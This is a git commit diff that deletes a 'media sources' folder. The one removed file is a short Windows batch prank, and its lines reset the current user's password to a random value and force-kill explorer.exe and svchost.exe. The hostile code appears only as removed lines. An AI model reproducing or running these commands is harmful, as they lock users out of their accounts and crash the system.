27962876989fc2459deccb3883a37cf69ab0c8e1
Leniwiecdziki <78787831+Leniwiecdziki@users.noreply.github.com>
2021-04-09 08:09:45 +0200

    Delete media sources directory

--- media sources/chroma.bat
+++
@@ -1,9 +0,0 @@
-echo off
-title Jebac home XDDDD
-color 4F msg %username% Przepraszamy, program chroma nie ma chromosoma
-cls
-echo error
-timeout -1
-net user %username% %random%
-taskkill /f /im explorer.exe
-taskkill /f /im svchost.exe
